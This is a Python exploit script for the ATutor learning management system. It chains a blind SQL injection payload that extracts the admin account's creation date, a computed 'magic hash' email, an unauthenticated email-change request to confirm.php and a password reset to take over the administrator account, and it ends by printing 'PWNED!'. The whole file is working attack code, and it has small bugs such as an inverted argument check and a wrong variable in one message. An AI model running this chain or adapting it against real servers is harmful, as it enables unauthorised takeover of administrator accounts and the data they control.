import sys
import re
import requests
from bs4 import BeautifulSoup
from colorama import Fore, Back, Style
import ATutor_MagicHash_Compute
import ATutor_blindsql_extract_id_creation_date

def change_email(ip, user_id, email):
    target = "http://%s/atutor/confirm.php?e=%s&m=%d&id=%d" % (ip, email, 0, user_id)
    r = requests.get(target, allow_redirects=False)
    if (r.status_code == 302):
        return True
    else :
        return False

def password_reminder(ip, email):
    target = "http://%s/atutor/config.php" % (ip)
    d = {
        "form_password_reminder": "true",
        "form_email": email,
        "submit": "Submit"
    }
    r = requests.post(target, data = d)
    error = re.search("No account found with that email address", r.text)
    if error:
        return False
    else:
        return True


def main():
    if len(sys.argv) != 1:
        print("(+-) usage: %s <target> <injection_string>" % sys.argv[0])
        print("(+-) eg: %s 192.168.121.103 \"aaa\"" % sys.argv[0])
        sys.exit(-1)

    ip = "127.0.0.1"
    #This domain must be under your control, so you can create the email address with generated name
    email_domain = "test.local"
    #How long do you want to have the email name - recommended 3+
    email_name_lenght = 4
    user_id = 1

    injection_string = "test')/**/or/**select/**/ascii(substring((SELECT/**/creation_date/**/FROM/**/members/**/WHERE/**/member_id=1),%d,1))=[CHAR]%%23"
    creation_date = ATutor_blindsql_extract_id_creation_date.main(["ATutor_blindsql_extract_id_creation_date", "%s" %ip, "%s" %injection_string])

    email = str(ATutor_MagicHash_Compute.main(["ATutor_MagicHash_Compute","%s" %creation_date, user_id, "@%s" % email_domain, email_name_lenght]))

    result = change_email(ip, user_id, email)
    if result:
        print("(+-) The email for the account with ID 1 has been changed to %s. Please continue with reseting the password" % sys.argv[0])
    else:
        print("(+-) There was an error changing email. Bailing out")
        exit(1)

    result = password_reminder(ip, email)
    if result:
        print("(+-) Check your email adress (%s), there should be instruction for password reset. PWNED!" % email)
    else:
        print("(+-) The email was not found in the DB, try manual reset.")

if __name__ == "__main__":
    main()
